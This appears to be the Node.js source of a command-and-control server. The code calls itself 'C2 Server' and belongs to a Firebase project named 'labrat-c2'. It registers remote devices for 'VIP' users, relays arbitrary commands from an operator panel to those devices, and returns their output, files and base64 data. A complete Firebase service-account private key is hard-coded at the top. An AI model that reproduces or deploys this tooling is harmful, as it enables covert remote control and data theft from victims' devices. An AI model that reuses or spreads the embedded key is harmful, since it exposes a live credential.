const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore, FieldValue } = require('firebase-admin/firestore');
const cors = require('cors');

const serviceAccount = {
  "type": "service_account",
  "project_id": "labrat-c2",
  "private_key_id": "f5a83a5ba9e9507d20d44072f56eed7b79cc8146",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCp0QC+V/qc4JSz\nTsZYRZNRJUVsLEtuHwXiB16hewWBpKB/DGNYzDnq1FcFX/cc+v3gJb7hmjCS7av+\nk54f4+KCjvRnx7krr8XoVJsdvBIyhr3LbC+XYMm3MyI41tcNkfSlfBw3zhvO8/DM\n666Oz5PDmC1eNJ8p1/LxLGsY2EpScj7brE2EsfvvW+5zVZS76zdcNwdttL/sh1sn\njTonPlXrrq0/N8XIIyvx7VNDV2IUHJMRgKAjWcDBLJDcWv+zFvEuIrpFvj/yvhIQ\n4n0uUNgLOgCsjX7H1b72UWmPhN5hH2883iAfvqMpHAXIpsriU+lnbG85gT9xS92z\nubvjfmI1AgMBAAECggEABHoyKZu/OZrwQL9z43ZZlMjFkk+jPKNDwjqog5K4bjto\n4eU671VakLb3zmZCIAtFOQh+4dQDaNjjOobg2esc4h+io1GQQhKK/VlkAL4ynOpI\naKKQzc4rjshYtm2migpFDGHtiokgtiSFGlDpU/K/kYvaiTmKGaBnU3WHI1jqRCqb\n0i5nQKjACwFhFz7+ADoStn0Vaxq9sEZI7mxrDJInkYHj5FIAdY+4XYsKQpncBfBx\n9SMpqE23hZIciMc5ohyA6YiirlZinpE5TzNWgb/dbtry6tZ1FiZ523XijR1wRMyE\nLJHoUunn7ohmLQDqkxCnrUJlkMOgEXUr02pXyPdzUQKBgQDSX4/4Z8JmBaG2AC40\nN0gNclBuLp2+9eZZA2ysONFAPQ0XlpZW6lypwHzYlshEWIGEJI5rmvUGasACmFvl\nMQBa8xKq7DNBxrgG/JyAFsvqIihsUfQRLh3mtXYKMROFL/UxQ8Btzz7RsfQCSebL\nxDld2IbvnV6anMZI2EBf4685mQKBgQDOpZ/Guj5aQO1/13PZ/kr1FmixHR4lVT1t\nw/cxEm3eSnFVPnDfAn25BivRUsqlKkKtq9XtdJoMBfIqLAf5Y15HiLsX6jzOOCc0\nre4MrW2UHhKOFsYY51zl503aCmi4Qua65Y7hhy/kBoqyIWjkNY1ZnHPIxjbx1kDs\nQWkzuAvm/QKBgDyiMHOvLDeNfftf9/Ey0cCWZxoqs2qboyWauBK3WZBDSGe5DmHE\nsKp4gUNHyjbwr3uvsaDQC7kqwWa+FRZs1iZgksvSwj8+EEJrQowkhedYqv/1avwc\np5+cQ4ZSeMbVeL0XQvojVn7H5IVYWX33c3VZ+CJN4Dt93iSWt48rp5BZAoGAIPgb\nvcEJIa0qNzNQsH75xpCEs31JyfsHifOyBIpELSsDWe5UY8Ap/tMVOphS7HcJnFvG\nDdSEn1ZzhHbx7sAD0rXl47LjcKNU3frB+BPTX8ZMf47ynBaNo8B7k0YF3yANX9Qw\nL5s58M96YWEjMwW4P4vOjUHSklL0mLz24+GBRKECgYBTbzNPItqu6D40mZBSHq+y\n1zZm5JUHbWyA3E6pbfoQyJD3lclPAeFQZBT04T/FlI10CxDiKcNtqou2lXf7La21\nBTUQ4uQ7IpR+TY3ANHz/Wyu7lApA1Bx/+MQXPIFZgbIuCPJfEi083hzt/nFh6314\nq+qj7slTHb5d78dcYHBy5Q==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@labrat-c2.iam.gserviceaccount.com",
  "client_id": "110692212383184318404",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40labrat-c2.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

initializeApp({ credential: cert(serviceAccount) });
const db = getFirestore();

const app = express();
app.use(cors());
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const devices = new Map();
const panels = new Map();

io.on('connection', (socket) => {
    console.log(`[WS] Client connected: ${socket.id}`);

    socket.on('register_device', async (data) => {
        const { appuid, deviceInfo } = data;
        if (!appuid) return socket.disconnect();

        try {
            const userSnap = await db.collection("users").doc(appuid).get();
            if (!userSnap.exists) {
                socket.emit('error_auth', 'Appuid not found');
                return socket.disconnect();
            }
            const user = userSnap.data();
            if (user.role !== 'vip' && user.role !== 'developer') {
                socket.emit('error_auth', 'Appuid not active (Not VIP)');
                return socket.disconnect();
            }

            devices.set(appuid, socket.id);
            await db.collection("devices").doc(appuid).set({
                online: true,
                lastSeen: FieldValue.serverTimestamp(),
                deviceInfo: deviceInfo || {}
            }, { merge: true });

            console.log(`[+] Device registered: ${appuid}`);
            socket.emit('registered', { ok: true });

            const panelSocket = panels.get(appuid);
            if (panelSocket) io.to(panelSocket).emit('device_status', { online: true });

        } catch (e) { console.error(e); }
    });

    socket.on('register_panel', (data) => {
        const { appuid } = data;
        panels.set(appuid, socket.id);
        const isOnline = devices.has(appuid);
        socket.emit('device_status', { online: isOnline });
    });

    socket.on('send_command', async (data) => {
        const { appuid, command, args } = data;
        const targetSocketId = devices.get(appuid);

        if (!targetSocketId) {
            return socket.emit('command_output', { type: "error", output: "Device offline" });
        }

        io.to(targetSocketId).emit('execute_command', { command, args });
        console.log(`[CMD] Sent to ${appuid}: ${command}`);
    });

    socket.on('command_output', (data) => {
        const { appuid, type, output, files, base64, info } = data;
        const panelSocket = panels.get(appuid);
        if (panelSocket) {
            io.to(panelSocket).emit('command_output', { type, output, files, base64, info });
        }
    });

    socket.on('disconnect', async () => {
        for (let [appuid, sockId] of devices.entries()) {
            if (sockId === socket.id) {
                devices.delete(appuid);
                await db.collection("devices").doc(appuid).update({ online: false });
                console.log(`[-] Device disconnected: ${appuid}`);
                const panelSocket = panels.get(appuid);
                if (panelSocket) io.to(panelSocket).emit('device_status', { online: false });
                break;
            }
        }
        for (let [appuid, sockId] of panels.entries()) {
            if (sockId === socket.id) {
                panels.delete(appuid);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`C2 Server running on port ${PORT}`));
